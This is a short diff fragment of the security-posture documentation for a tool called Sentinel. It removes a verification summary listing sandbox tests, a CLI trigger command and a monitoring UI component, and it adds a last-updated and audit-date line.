-
-### Verification Summary
-*   **Unit Tests**: `tests/ci_sandbox.test.js` validates threat detection logic with mock telemetry.
-*   **CLI Verification**: `sntl sandbox trigger` provides real-time polling and feedback.
-*   **UI Verification**: `SandboxMonitor.tsx` allows developers to launch and inspect analysis visually.
-
----
-
-*This document serves as the official security posture for Sentinel. Version 3.0 marks the transition from purely static defense to an active, dynamic security platform.*
+*Last updated: 2026-04-14. Next audit scheduled: 2026-04-15 (automated).*
